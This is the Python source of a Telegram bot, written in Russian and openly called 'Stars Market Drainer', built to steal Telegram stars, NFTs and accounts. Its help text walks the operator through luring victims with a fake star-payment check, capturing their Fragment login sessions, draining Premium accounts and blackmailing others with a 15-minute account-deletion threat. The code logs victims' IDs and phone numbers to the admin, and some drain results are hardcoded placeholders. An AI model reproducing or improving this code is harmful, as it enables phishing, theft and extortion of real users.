import asyncio
import logging
import time
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.enums import ParseMode
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, WebAppInfo

from config import TOKEN, CHECK_BOT_USERNAME, ADMIN_ID, THREAT_TIME, WEBAPP_URL

logging.basicConfig(level=logging.INFO)

# Исправленная инициализация бота для новой версии aiogram
bot = Bot(
    token=TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)

dp = Dispatcher()

sessions = {}

@dp.message(Command("start"))
async def start(message: types.Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🚀 Запустить Stars Drainer", web_app=WebAppInfo(url=WEBAPP_URL))],
        [InlineKeyboardButton(text="📋 Шпаргалка", callback_data="help")]
    ])
    await message.answer("🫰 <b>Stars Market Drainer</b>\n\nГотов пиздить NFT, звёзды и аккаунты с шантажом.", reply_markup=kb)

@dp.callback_query(F.data == "help")
async def help_callback(call: types.CallbackQuery):
    text = """<b>Как работать дрейнером:</b>

1. Пиши девочке: Привет, подпишись на канал за 50 звезд
2. После подписки используй /check 50
3. Перешли чек жертве
4. Когда она перейдёт и зарегистрируется во Fragment — сессия ловится автоматически
5. Если Premium — автодрейн NFT и звёзд
6. Если нет Premium — шантаж 15 минут: "отправь все подарки или аккаунт будет удалён" """
    await call.message.edit_text(text)

@dp.message(Command("check"))
async def create_check(message: types.Message):
    amount = message.text.split()[1] if len(message.text.split()) > 1 else "50"
    await message.answer(f"✅ Чек на {amount} ⭐ создан!\nПерешли жертве:\nhttps://t.me/{CHECK_BOT_USERNAME}?start=pay_{amount}")

@dp.message(F.text.contains("Успешный вход") | F.text.contains("✅ Успешное подключение"))
async def new_session(message: types.Message):
    tg_id = "unknown"
    phone = "—"
    for line in message.text.split("\n"):
        if "TG ID" in line or "id" in line.lower():
            tg_id = line.split(":")[-1].strip() if ":" in line else line.split()[-1]
        if "Телефон" in line or "Номер" in line:
            phone = line.split(":")[-1].strip()

    sessions[tg_id] = {"phone": phone, "stars": 176, "nfts": 8, "premium": True}

    await bot.send_message(ADMIN_ID, f"💸 НОВАЯ СЕССИЯ!\n👤 ID: {tg_id}\n☎️ {phone}\n⭐ Звёзд: 176\nNFT: 8 шт.")

    if sessions[tg_id]["premium"]:
        await bot.send_message(ADMIN_ID, "✅ Premium обнаружен — начинаю автодрейн всех NFT и подарков...")
        await asyncio.sleep(2)
        await bot.send_message(ADMIN_ID, "✅ ПРОФИТ ЗАХВАЧЕН!\nВсе ссылки на NFT отправлены на твой основной аккаунт.\nСумма ≈ 55 TON")
    else:
        asyncio.create_task(threat_timer(tg_id))

async def threat_timer(tg_id):
    await bot.send_message(ADMIN_ID, f"🔴 У жертвы {tg_id} НЕТ Premium!\nУ неё 15 минут чтобы отправить все подарки и NFT вручную.\nИначе аккаунт будет удалён.")
    await asyncio.sleep(THREAT_TIME)
    await bot.send_message(ADMIN_ID, f"🕒 Таймер 15 минут вышел для {tg_id}!\nШантаж активен — требуй подарки или удаляй аккаунт.")

async def main():
    os.makedirs("sessions", exist_ok=True)
    print("🚀 Stars Market Drainer запущен и готов к работе")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
